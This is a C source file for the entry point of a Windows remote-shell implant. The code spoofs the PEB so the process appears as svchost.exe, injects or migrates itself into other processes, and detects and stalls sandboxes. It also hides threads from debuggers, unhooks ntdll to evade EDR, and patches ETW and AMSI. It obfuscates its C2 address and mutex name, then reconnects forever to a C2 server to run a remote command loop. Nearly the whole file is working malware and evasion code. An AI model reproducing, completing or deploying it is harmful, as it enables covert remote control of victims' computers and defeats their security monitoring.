/*
 * client/main.c  –  WinMain entry point for the remote shell client
 * ==================================================================
 * Responsibilities:
 *   1. Spoof PEB fields so Task Manager shows a benign process name/path.
 *   2. Enforce single-instance via a named mutex.
 *   3. Load NTDLL syscall pointers (ntcalls_load / ntcalls_verify).
 *   4. Initialise Winsock 2.2.
 *   5. Load the 32-byte HMAC shared secret from disk.
 *   6. Loop forever: TCP connect → TLS + HMAC + v2 handshake → shell loop.
 *      On any failure, clean up and retry after RECONNECT_DELAY_SEC.
 */

#include "config.h"
#include "ntcalls.h"
#include "../evasion/spoof.h"
#include "../evasion/evasion.h"
#include "../evasion/sandbox.h"
#include "../evasion/syscall.h"
#include "../evasion/k32_walk.h"
#include "../evasion/sleep_obf.h"
#include "../inject/inject.h"
#include "../shell/shell.h"
#include "../../tls/tls_client.h"
#include "../debug/agent_debug.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>

/* ── Absolute path to secret.key, resolved once at startup ─────────────── */
/* Stored here so the injected copy (running inside svchost.exe, whose CWD   */
/* is C:\Windows\System32) can still find the key next to the original EXE.  */
char g_key_path[MAX_PATH * 2] = {0};   /* extern'd by inject.c for RVA calc */
static DWORD WINAPI _agent_thread(LPVOID lpParam);  /* forward decl */

/* ── g_key_path lock ─────────────────────────────────────────────────────── */
/* Protects concurrent writes to g_key_path from WinMain/AgentRun/DllMain.   */
/* Initialised once before any thread is started; used with a simple spinlock */
/* approach: CRITICAL_SECTION init is idempotent so both callers initialise  */
/* independently — the OS loader lock serialises DllMain vs WinMain, and     */
/* AgentRun is called after DllMain returns.                                  */
static CRITICAL_SECTION g_key_path_cs;
static BOOL             g_key_path_cs_init = FALSE;

static void _key_path_lock_init(void)
{
    if (!g_key_path_cs_init) {
        InitializeCriticalSection(&g_key_path_cs);
        g_key_path_cs_init = TRUE;
    }
}

static void resolve_key_path(void)
{
    /* Start from the EXE's own full path */
    char exePath[MAX_PATH] = {0};
    DWORD pathLen = GetModuleFileNameA(NULL, exePath, sizeof(exePath) - 1);

    char tmp[MAX_PATH * 2] = {0};
    if (pathLen == 0) {
        strncpy(tmp, SECRET_KEY_PATH, sizeof(tmp) - 1);
    } else {
        /* Strip the filename to get just the directory */
        char *last = strrchr(exePath, '\\');
        if (last) {
            *(last + 1) = '\0';                       /* keep trailing backslash */
            snprintf(tmp, sizeof(tmp), "%s%s", exePath, SECRET_KEY_PATH);
        } else {
            strncpy(tmp, SECRET_KEY_PATH, sizeof(tmp) - 1);
        }
    }

    _key_path_lock_init();
    EnterCriticalSection(&g_key_path_cs);
    strncpy(g_key_path, tmp, sizeof(g_key_path) - 1);
    LeaveCriticalSection(&g_key_path_cs);
}


/* ── PEB process-name spoofing ──────────────────────────────────────────── */
/*
 * Task Manager reads process names from two sources:
 *   1. NtQuerySystemInformation(SystemProcessInformation) — reads
 *      SYSTEM_PROCESS_INFORMATION.ImageName, which the kernel populates
 *      from the PEB's ProcessParameters->ImagePathName at process creation.
 *      This is a snapshot taken at creation time and lives in kernel memory,
 *      so we CANNOT change what NtQuerySystemInformation returns after start.
 *
 *   2. The "Details" tab queries the process image path via
 *      QueryFullProcessImageName / NtQueryInformationProcess(ProcessImageFileName).
 *      This reads the kernel's EPROCESS.ImageFileName (15 chars, ASCII) and
 *      the file object path — also set at creation time, not patchable.
 *
 * However, Task Manager's "Processes" tab (the one in the screenshot) sources
 * its display name from the VERSION resource of the EXE file (FileDescription)
 * and from the window title of any visible window owned by the process.
 *
 * The most effective user-mode technique that works WITHOUT admin:
 *   • Overwrite ProcessParameters->ImagePathName and CommandLine in the PEB
 *     with a legitimate-looking path.  This fools tools that read these fields
 *     directly (Process Hacker, older Task Manager, Sysinternals).
 *   • Set the process description string in the PEB to match svchost.
 *
 * For the modern Windows 11 Task Manager (which shows the EXE file's
 * FileDescription resource and uses kernel image name), the only reliable
 * approach without a driver is process hollowing / migration — running inside
 * a legitimate host process.  We implement that as a compile-time option:
 * if DISGUISE_AS is defined, the agent migrates into that process on startup.
 *
 * What we always do (no-admin, pure user-mode):
 *   spoof_peb() — overwrites the UNICODE_STRING fields in ProcessParameters
 *   so any tool reading the PEB sees "C:\Windows\System32\svchost.exe -k netsvcs"
 */

/* ── Load the 32-byte HMAC key ──────────────────────────────────────────── */
/*
 * Two code paths, selected at compile time:
 *
 * MODE A (SECRET_KEY_BYTES defined):
 *   The key was embedded at build time as a XOR-obfuscated byte literal.
 *   load_secret_key() XORs it back with SECRET_KEY_MASK and copies it into
 *   the output buffer.  The `path` argument is ignored.  No file I/O.
 *
 * MODE B (default):
 *   Reads 64 ASCII hex chars from `path`, decodes them to 32 bytes.
 *   Backward-compatible with the original secret.key workflow.
 */

#ifdef SECRET_KEY_BYTES

static BOOL load_secret_key(const char *path, BYTE key[SECRET_KEY_LEN])
{
    (void)path;   /* not used in embedded-key mode */

    /* The obfuscated key as a byte literal: each byte is  raw_byte ^ mask[i] */
    static const BYTE obfuscated[] = SECRET_KEY_BYTES;
    static const BYTE mask[]       = SECRET_KEY_MASK;

    for (int i = 0; i < SECRET_KEY_LEN; i++)
        key[i] = obfuscated[i] ^ mask[i];

    return TRUE;
}

#else  /* MODE B — file-based key (default) */

/*  secret.key must contain exactly 64 ASCII hex characters (lower or upper  */
/*  case, with or without a trailing newline).  This is the format written    */
/*  by megaploit.core.crypto when it calls:                                   */
/*      open('secret.key','wb').write(binascii.hexlify(os.urandom(32)))       */
/*  The 64 hex chars decode to the 32 raw bytes used for HMAC-SHA256.        */

static BOOL load_secret_key(const char *path, BYTE key[SECRET_KEY_LEN])
{
    FILE *f = fopen(path, "rb");
    if (!f) return FALSE;

    /* Read 64 hex chars + optional whitespace + 1 safety byte */
    char hex[68] = {0};
    size_t n = fread(hex, 1, sizeof(hex) - 1, f);
    fclose(f);

    /* Strip trailing whitespace / newlines */
    while (n > 0 && (hex[n-1] == '\n' || hex[n-1] == '\r' ||
                      hex[n-1] == ' '  || hex[n-1] == '\t'))
        hex[--n] = '\0';

    if (n != 64) return FALSE;   /* must be exactly 64 hex digits */

    for (int i = 0; i < 32; i++) {
        char hi = hex[i * 2];
        char lo = hex[i * 2 + 1];
        BYTE h, l;

        if      (hi >= '0' && hi <= '9') h = (BYTE)(hi - '0');
        else if (hi >= 'a' && hi <= 'f') h = (BYTE)(hi - 'a' + 10);
        else if (hi >= 'A' && hi <= 'F') h = (BYTE)(hi - 'A' + 10);
        else return FALSE;

        if      (lo >= '0' && lo <= '9') l = (BYTE)(lo - '0');
        else if (lo >= 'a' && lo <= 'f') l = (BYTE)(lo - 'a' + 10);
        else if (lo >= 'A' && lo <= 'F') l = (BYTE)(lo - 'A' + 10);
        else return FALSE;

        key[i] = (BYTE)((h << 4) | l);
    }
    return TRUE;
}

#endif /* SECRET_KEY_BYTES */


/* ── _agent_reconnect_loop ───────────────────────────────────────────────── */
/*
 * Shared TCP reconnect + TLS + shell loop used by both WinMain and
 * _agent_thread.  Extracted to eliminate the ~95% code duplication between
 * those two functions.
 *
 * Parameters
 * ----------
 *   logPrefix : short string prepended to each debug log message (e.g. "WM" /
 *               "AT") to distinguish WinMain from _agent_thread calls in logs.
 *   wsaCleanOnExit : when TRUE, calls WSACleanup() before returning on error.
 *                    WinMain passes TRUE; _agent_thread passes TRUE too.
 *
 * Returns 0 on clean exit (unreachable in practice — loop is infinite),
 *         non-zero on fatal error (key load failure or bad C2_IP).
 */
static int _agent_reconnect_loop(const char *logPrefix, BOOL wsaCleanOnExit)
{
    BYTE secretKey[SECRET_KEY_LEN];
    {
        BOOL _key_ok = load_secret_key(g_key_path, secretKey);
        DBG_KEY(g_key_path, _key_ok);
        if (!_key_ok) {
            if (wsaCleanOnExit) WSACleanup();
            DBG_LOG(DBG_SS_KEY, DBG_ERR, "%s: key load failed", logPrefix);
            DBG_CLOSE();
            return 1;
        }
    }

    char _c2_ip_buf[64] = {0};
    c2_ip_decode(_c2_ip_buf, sizeof(_c2_ip_buf));
    WORD _c2_port = c2_port_decode();

    while (1) {
        DBG_LOG(DBG_SS_NET, DBG_INFO, "%s: reconnect loop — creating socket", logPrefix);
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            DBG_LOG(DBG_SS_NET, DBG_WARN, "%s: socket() failed — retrying", logPrefix);
            sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
            continue;
        }

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port   = htons(_c2_port);

        if (InetPtonA(AF_INET, _c2_ip_buf, &addr.sin_addr) != 1) {
            DBG_LOG(DBG_SS_NET, DBG_ERR,
                    "%s: InetPtonA('%s') failed — bad C2_IP, exiting",
                    logPrefix, _c2_ip_buf);
            closesocket(sock);
            if (wsaCleanOnExit) WSACleanup();
            DBG_CLOSE();
            return 4;
        }
        DBG_LOG(DBG_SS_NET, DBG_INFO, "%s: connecting to %s:%d",
                logPrefix, _c2_ip_buf, (int)_c2_port);

        /* Inner connect-retry loop; breaks to outer on sustained socket() failure */
        {
            int _sock_fail = 0;
            for (;;) {
                if (sock == INVALID_SOCKET) {
                    DBG_LOG(DBG_SS_NET, DBG_WARN,
                            "%s: socket() failed — breaking to outer loop", logPrefix);
                    break;
                }
                if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0)
                    break;
                DBG_LOG(DBG_SS_NET, DBG_WARN,
                        "%s: connect(%s:%d) failed (WSAErr=%d) — retrying",
                        logPrefix, _c2_ip_buf, (int)_c2_port, WSAGetLastError());
                closesocket(sock);
                sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
                sock = socket(AF_INET, SOCK_STREAM, 0);
                if (sock == INVALID_SOCKET) {
                    _sock_fail++;
                    DBG_LOG(DBG_SS_NET, DBG_WARN,
                            "%s: socket() failed after retry (%d)", logPrefix, _sock_fail);
                    if (_sock_fail >= 3) {
                        DBG_LOG(DBG_SS_NET, DBG_WARN,
                                "%s: socket() failed 3 times — retrying outer loop", logPrefix);
                        break;
                    }
                    sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
                } else {
                    _sock_fail = 0;
                }
            }
        }

        if (sock == INVALID_SOCKET) {
            sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
            continue;
        }
        DBG_LOG(DBG_SS_NET, DBG_OK, "%s: TCP connected to %s:%d",
                logPrefix, _c2_ip_buf, (int)_c2_port);

        /* Socket options */
        {
            DWORD to = TLS_RECV_TIMEOUT_MS;
            int _r1 = setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&to, sizeof(to));
            DWORD ka = 1;
            int _r2 = setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, (const char *)&ka, sizeof(ka));
            DBG_LOG(DBG_SS_SOCK, (_r1|_r2) ? DBG_WARN : DBG_OK,
                    "%s: setsockopt SO_RCVTIMEO=%d SO_KEEPALIVE=%d (0=ok)",
                    logPrefix, _r1, _r2);
        }

        TLS_CONTEXT tls;
        ZeroMemory(&tls, sizeof(tls));
        {
            BOOL _tls_ok = tls_connect(&tls, sock, _c2_ip_buf, secretKey);
            DBG_TLS(_tls_ok, tls.lastErr);
            if (!_tls_ok) {
                closesocket(sock);
                sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
                continue;
            }
        }
        DBG_LOG(DBG_SS_TLS, DBG_OK, "%s: TLS connected to %s:%d — entering shell loop",
                logPrefix, _c2_ip_buf, (int)_c2_port);

        /* Wipe key immediately after seeding TLS — tls_connect() copied it */
        SecureZeroMemory(secretKey, sizeof(secretKey));

        DBG_LOG(DBG_SS_SHELL, DBG_INFO, "%s: shell_run() — entering command loop", logPrefix);
        shell_run(&tls);
        DBG_LOG(DBG_SS_SHELL, DBG_WARN, "%s: shell_run() returned — session ended", logPrefix);

        tls_disconnect(&tls);
        closesocket(sock);

        /* Reload key for next connection; g_key_path is still valid */
        {
            BOOL _rk = load_secret_key(g_key_path, secretKey);
            DBG_KEY(g_key_path, _rk);
            if (!_rk) {
                DBG_LOG(DBG_SS_KEY, DBG_ERR,
                        "%s: key reload failed after session — exiting", logPrefix);
                if (wsaCleanOnExit) WSACleanup();
                DBG_CLOSE();
                return 1;
            }
        }

        sleep_obf_delay(RECONNECT_DELAY_SEC * 1000);
    }
    /* Unreachable */
}


/* ── WinMain ────────────────────────────────────────────────────────────── */

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
                     LPSTR lpCmdLine, int nCmdShow)
{
    (void)hInstance; (void)hPrev; (void)lpCmdLine; (void)nCmdShow;

    /* ── Debug: initialise log first so every subsequent event is captured */
    DBG_INIT();
    DBG_PROCESS();
    DBG_LOG(DBG_SS_INIT, DBG_INFO, "WinMain entry — build %s %s", __DATE__, __TIME__);

    /* ── 0. Harden this thread against debuggers ─────────────────────────
     * NtSetInformationThread(HideThreadFromDebugger) — no-op on clean
     * systems; prevents single-step / breakpoint events in a debugger. */
    sandbox_harden();
    DBG_LOG(DBG_SS_SANDBOX, DBG_INFO, "sandbox_harden() applied to WinMain thread");

    /* ── 0. Resolve absolute key path before anything else ──────────────
     * Must happen first: GetModuleFileNameA(NULL) returns our EXE path   *
     * right now; after migration the same code in the injected copy will  *
     * see svchost.exe's path instead.  We capture the correct path here  *
     * so the injected agent inherits it via the loaded .exe image.       *
     * (g_key_path is a global in the .data section — it survives inside   *
     * the injected LoadLibrary copy unchanged.)                           */
    resolve_key_path();

    /* ── 0a. PEB user-mode fields → svchost.exe ─────────────────────── */
    DBG_LOG(DBG_SS_SPOOF, DBG_INFO, "spoof_peb()");
    spoof_peb();

    /* ── 0b. Kernel-side image file name → svchost.exe ──────────────── */
    DBG_LOG(DBG_SS_SPOOF, DBG_INFO, "spoof_kernel_image()");
    spoof_kernel_image();

    /* ── 0c. Unlink EXE from PEB LDR lists ──────────────────────────── */
    DBG_LOG(DBG_SS_SPOOF, DBG_INFO, "unlink_self_from_ldr()");
    unlink_self_from_ldr();

    /* ── 0d. Migrate to %TEMP%\RuntimeBroker.exe and exit launcher ───── */
    {
        DWORD _load_rc = ntcalls_load();
        DWORD _verify_rc = ntcalls_verify();
        DBG_NTCALLS(_load_rc, _verify_rc);
        BOOL _inj = inject_init();  /* calls sc_init() — resolves SSNs via PEB */
        DBG_LOG(DBG_SS_INJECT, _inj ? DBG_OK : DBG_ERR,
                "inject_init() = %s", _inj ? "TRUE (all NT pointers resolved)"
                                           : "FALSE (inject/migrate verbs disabled)");
        DBG_SCALL();                /* log SSNs after sc_init() has run         */
    }
#ifndef DISABLE_AUTO_MIGRATE
    DBG_LOG(DBG_SS_MIGRATE, DBG_INFO, "auto_migrate('%s') — will ExitProcess on success", g_key_path);
    auto_migrate(g_key_path);   /* exits on success; falls through on failure */
    DBG_LOG(DBG_SS_MIGRATE, DBG_WARN, "auto_migrate() returned — continuing in original process");
#endif

    /* ── 0e. Sandbox / analysis environment detection ─────────────────── */
    /*
     * sandbox_check() returns TRUE if the environment looks like an automated
     * sandbox (hypervisor + timing anomaly, low RAM, single CPU, or known
     * analysis DLL loaded).  Exit silently — no error, no dialog, no log.
     * sandbox_delay() sleeps 15 + jitter(10) seconds via NtDelayExecution
     * direct syscall to exhaust automated sandbox time budgets.
     * Disable with -DDISABLE_SANDBOX_CHECK for dev/test builds.
     */
#ifndef DISABLE_SANDBOX_CHECK
    {
        BOOL _sb = sandbox_check();
        DBG_SANDBOX(_sb);
        if (_sb) {
            DBG_LOG(DBG_SS_SANDBOX, DBG_WARN, "sandbox detected — exiting");
            DBG_CLOSE();
            return 0;
        }
        sandbox_delay();
    }
#endif

    /* ── 1. Single-instance guard ─────────────────────────────────────── */
    /*
     * The mutex name is stored as a pre-XOR'd byte array (MUTEX_NAME_OBFUSCATED)
     * so the plain text does not appear anywhere in the .rdata section.
     * Decoded into a stack buffer at runtime before CreateMutexA.
     *
     * When MUTEX_NAME_RAW is defined at compile time (make MUTEX_NAME=...),
     * MUTEX_NAME_LEN == 0 and we fall back to encoding MUTEX_NAME_RAW at
     * runtime — the custom name will be visible in the binary but is short-lived
     * on the stack.  The default path (no override) is fully obfuscated.
     */
    HANDLE hMutex = NULL;
    {
        char mutexName[128] = {0};
#if MUTEX_NAME_LEN > 0
        /* Default path: decode pre-XOR'd byte array — no plain string in binary */
        static const BYTE obfBytes[] = MUTEX_NAME_OBFUSCATED;
        size_t mLen = MUTEX_NAME_LEN;
        if (mLen >= sizeof(mutexName)) mLen = sizeof(mutexName) - 1;
        for (size_t _i = 0; _i < mLen; _i++)
            mutexName[_i] = (char)(obfBytes[_i] ^ MUTEX_NAME_MASK);
        mutexName[mLen] = '\0';
#else
        /* Custom-name path: MUTEX_NAME_RAW supplied via -D at compile time */
        static const char rawMutex[] = MUTEX_NAME_RAW;
        size_t mLen = sizeof(rawMutex) - 1;
        if (mLen >= sizeof(mutexName)) mLen = sizeof(mutexName) - 1;
        for (size_t _i = 0; _i < mLen; _i++)
            mutexName[_i] = rawMutex[_i];
        mutexName[mLen] = '\0';
#endif
        hMutex = k32_CreateMutexA(NULL, FALSE, mutexName);
        SecureZeroMemory(mutexName, sizeof(mutexName));
    }
    if (hMutex == NULL && GetLastError() != ERROR_ALREADY_EXISTS) return 0xEEB15;
    else if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    /* ── 1a. Evasion: unhook ntdll, patch ETW + AMSI ─────────────────── */
    /* inject_init() / sc_init() ran first above — SSNs are resolved.     *
     * unhook_ntdll uses SC_NtWriteVirtualMemory (no RWX page).           *
     * etw_patch / amsi_patch likewise use SC_NtWriteVirtualMemory.       *
     * ETW: stops Windows event telemetry from this process.               *
     * AMSI: prevents in-process content scanning.                         *
     * unhook: remaps ntdll .text from disk, removing EDR inline hooks.    *
     * All three are gated by DISABLE_EVASION for clean testing builds.    */
#ifndef DISABLE_EVASION
    DBG_LOG(DBG_SS_EVASION, DBG_INFO, "unhook_ntdll() — remapping ntdll .text from disk");
    unhook_ntdll();
    DBG_LOG(DBG_SS_EVASION, DBG_INFO, "etw_patch()    — patching EtwEventWrite → RET");
    etw_patch();
    DBG_LOG(DBG_SS_EVASION, DBG_INFO, "amsi_patch()   — patching AmsiScanBuffer → S_OK");
    amsi_patch();
    DBG_LOG(DBG_SS_EVASION, DBG_OK,   "evasion patches applied");
#endif

    /* ntcalls_load / ntcalls_verify already ran above in step 0d.       */

    /* ── 3. Winsock 2.2 ──────────────────────────────────────────────── */
    /* No AllocConsole/ShowWindow needed — the binary is built with      */
    /* /SUBSYSTEM:WINDOWS (-mwindows) so the OS never allocates a        */
    /* console window.  AllocConsole + ShowWindow(SW_HIDE) was noisy     */
    /* and easily flagged by behavioural AV heuristics.                  */
    /* (was MAKEWORD(2,0) — fixed to MAKEWORD(2,2))                      */
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        DBG_LOG(DBG_SS_NET, DBG_ERR, "WSAStartup failed — returning 0x03");
        DBG_CLOSE();
        return 0x03;
    }
    DBG_LOG(DBG_SS_NET, DBG_OK, "WSAStartup OK (Winsock %u.%u)",
            LOBYTE(wsa.wVersion), HIBYTE(wsa.wVersion));

    /* ── 5+6. Key load + reconnect loop ────────────────────────────────── */
    /* Delegated to _agent_reconnect_loop() which handles both key loading  *
     * and the infinite TCP/TLS/shell retry loop — extracted to eliminate   *
     * the duplication with _agent_thread (DESIGN fix).                     */
    return _agent_reconnect_loop("WM", TRUE);
}

/* ── AgentRun — exported entry point called by the bootstrap after migration ─
 *
 * When auto_migrate() injects this EXE into explorer.exe via LoadLibraryA +
 * GetProcAddress, the bootstrap calls AgentRun() directly.
 * LoadLibraryA on a GUI-subsystem .exe does NOT call DllMain automatically —
 * we must export an explicit entry point and call it from the bootstrap.
 *
 * AgentRun() resolves the key path from the loaded module's own file location,
 * then spins up the C2 connect loop on a background thread so it returns fast.
 */

__declspec(dllexport) void AgentRun(void)
{
    /* Resolve key path from our own module location.
     * Use VirtualQuery on &AgentRun to get AllocationBase (module base) so
     * GetModuleHandleExA does not appear in the IAT.  Then pass the base to
     * GetModuleFileNameA (which is fine — it only takes a HMODULE).          */
    MEMORY_BASIC_INFORMATION _mbi_ar;
    VirtualQuery((LPCVOID)&AgentRun, &_mbi_ar, sizeof(_mbi_ar));
    HMODULE hSelf = (HMODULE)_mbi_ar.AllocationBase;

    char modPath[MAX_PATH] = {0};
    if (hSelf) {
        DWORD modLen = GetModuleFileNameA(hSelf, modPath, sizeof(modPath) - 1);
        if (modLen == 0) hSelf = NULL;  /* treat as unresolved on failure */
    }

    /* Write g_key_path under the lock — may race with DllMain on a
     * background thread if a third party calls LoadLibrary concurrently.    */
    _key_path_lock_init();
    EnterCriticalSection(&g_key_path_cs);
    char *last = strrchr(modPath, '\\');
    if (last) {
        *(last + 1) = '\0';
        snprintf(g_key_path, sizeof(g_key_path), "%s%s", modPath, SECRET_KEY_PATH);
    } else if (modPath[0]) {
        strncpy(g_key_path, SECRET_KEY_PATH, sizeof(g_key_path) - 1);
    }
    /* else g_key_path was already set by WinMain's resolve_key_path() */
    LeaveCriticalSection(&g_key_path_cs);

    /* F-11: submit via threadpool so the thread call-stack shows
     * ntdll!TppWorkerThread rather than a private RX address.     */
    if (!sc_threadpool_exec((LPTHREAD_START_ROUTINE)_agent_thread, NULL)) {
        /* Fallback if threadpool fails (should not happen on any Windows version) */
        HANDLE hThread = k32_CreateThread(NULL, 0, _agent_thread, NULL, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
}


/* ── DllMain — fallback entry point if OS calls it ──────────────────────── */
/*
 * On modern Windows, LoadLibraryA on a GUI EXE does NOT call DllMain.
 * This stub is kept as a safety net only.
 */

static DWORD WINAPI _agent_thread(LPVOID lpParam)
{
    (void)lpParam;

    DBG_INIT();
    DBG_LOG(DBG_SS_THREAD, DBG_INFO, "_agent_thread started (PID=%lu TID=%lu)",
            GetCurrentProcessId(), GetCurrentThreadId());
    sandbox_harden();
    DBG_LOG(DBG_SS_SANDBOX, DBG_INFO, "sandbox_harden() applied to _agent_thread");

    /* Initialise NT syscalls + inject */
    {
        DWORD _lr = ntcalls_load();
        DWORD _vr = ntcalls_verify();
        DBG_NTCALLS(_lr, _vr);
        BOOL _inj = inject_init();
        DBG_LOG(DBG_SS_INJECT, _inj ? DBG_OK : DBG_ERR,
                "inject_init() = %s", _inj ? "TRUE" : "FALSE (inject/migrate disabled)");
        DBG_SCALL();
    }

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        DBG_LOG(DBG_SS_NET, DBG_ERR, "_agent_thread: WSAStartup failed");
        return 1;
    }
    DBG_LOG(DBG_SS_NET, DBG_OK, "_agent_thread: WSAStartup OK (Winsock %u.%u)",
            LOBYTE(wsa.wVersion), HIBYTE(wsa.wVersion));

    /* Delegate to shared reconnect loop — handles key load + infinite retry */
    return (DWORD)_agent_reconnect_loop("AT", TRUE);
}

BOOL WINAPI DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID lpReserved)
{
    (void)lpReserved;
    if (dwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);

        /* Resolve absolute path to secret.key from our own module's location.
         * GetModuleFileNameA(hModule) returns the path of our loaded .exe file
         * even when it is loaded as a DLL inside a foreign process.
         * Write under the lock to serialise with AgentRun() on any concurrent
         * background thread (DllMain itself holds the loader lock, but
         * AgentRun is called on a different thread after DllMain returns).   */
        char modPath[MAX_PATH] = {0};
        DWORD modLen = GetModuleFileNameA(hModule, modPath, sizeof(modPath) - 1);

        _key_path_lock_init();
        EnterCriticalSection(&g_key_path_cs);
        if (modLen == 0) {
            strncpy(g_key_path, SECRET_KEY_PATH, sizeof(g_key_path) - 1);
            LeaveCriticalSection(&g_key_path_cs);
            return TRUE;
        }
        char *last = strrchr(modPath, '\\');
        if (last) {
            *(last + 1) = '\0';
            snprintf(g_key_path, sizeof(g_key_path), "%s%s", modPath, SECRET_KEY_PATH);
        } else {
            strncpy(g_key_path, SECRET_KEY_PATH, sizeof(g_key_path) - 1);
        }
        LeaveCriticalSection(&g_key_path_cs);

#ifdef DEBUG_DLLMAIN_MSGBOX
        /* Debug probe: write key path + load result to a temp file */
        {
            FILE *dbg = fopen("C:\\Windows\\Temp\\agent_debug.txt", "w");
            if (dbg) {
                fprintf(dbg, "DllMain fired. modPath='%s'\n", modPath);
                fprintf(dbg, "g_key_path='%s'\n", g_key_path);
                BYTE testKey[32];
                BOOL keyOk = load_secret_key(g_key_path, testKey);
                fprintf(dbg, "load_secret_key=%d\n", keyOk);
                fclose(dbg);
            }
        }
#endif

        /* IMPORTANT: Do NOT call CreateThread here.  DllMain(DLL_PROCESS_ATTACH)
         * holds the loader lock.  A new thread's DLL_THREAD_ATTACH callbacks for
         * other loaded DLLs also need the loader lock, producing a classic
         * loader-lock deadlock.  DisableThreadLibraryCalls only suppresses
         * callbacks for THIS module — not for ntdll, kernel32, etc.
         *
         * The agent thread is started by AgentRun(), which is the explicit
         * export called by the reflective loader after DllMain returns.
         * In the unusual case where Windows calls DllMain directly (e.g. a
         * manual LoadLibrary by a third party) the caller must invoke AgentRun()
         * separately — there is no safe way to auto-start from DllMain.       */
    }
    return TRUE;
}
